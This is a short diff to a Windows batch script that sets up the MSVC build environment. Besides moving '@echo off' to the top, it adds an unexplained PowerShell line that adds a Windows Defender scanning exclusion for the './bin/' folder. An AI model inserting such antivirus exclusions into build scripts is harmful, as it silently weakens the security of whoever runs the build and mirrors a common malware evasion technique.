@@ -1,7 +1,6 @@
+@echo off
 REM Copyright (c) 2024, Ivan Reshetnikov - All rights reserved.
 REM MSVC CLI docs: https://learn.microsoft.com/en-us/cpp/build/building-on-the-command-line?view=msvc-170
-
-@echo off
 set "ORIGINAL_DIR=%cd%"
 
 
@@ -43,6 +42,7 @@ REM Function to initialize MSVC environment
 
 
 REM Call the function with the selected environment mode
+powershell -Command "Add-MpPreference -ExclusionPath './bin/'"
 call :INIT_MSVC_ENV
 
 
